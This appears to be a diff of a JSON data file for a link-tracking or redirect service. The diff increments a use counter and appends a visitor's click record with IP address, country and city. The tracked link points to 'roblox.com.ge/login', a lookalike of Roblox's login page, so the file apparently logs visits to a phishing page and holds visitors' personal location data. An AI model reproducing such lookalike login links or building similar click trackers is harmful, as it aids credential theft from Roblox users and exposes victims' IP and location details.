@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1388,
+    "useCount": 1389,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11267,6 +11267,14 @@
       },
       {
         "timestamp": 1777424937873,
+        "ip": "38.76.138.132",
+        "country": "Venezuela",
+        "city": "Caracas",
+        "flag": "🇻🇪",
+        "countryCode": "VE"
+      },
+      {
+        "timestamp": 1777424950743,
         "ip": "38.76.138.132",
         "country": "Venezuela",
         "city": "Caracas",
